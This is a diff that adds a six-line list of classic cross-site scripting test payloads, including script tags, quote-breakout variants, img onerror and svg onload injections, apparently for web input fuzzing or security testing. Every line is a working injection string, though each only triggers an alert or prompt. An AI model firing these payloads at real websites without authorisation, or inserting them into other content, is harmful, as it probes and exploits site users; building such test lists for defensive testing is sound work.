@@ -1,0 +1,6 @@
+<script>alert("XSS")</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert("XSS")>
+<svg/onload=prompt(1)>
+<marquee><h1>XSS</h1></marquee>
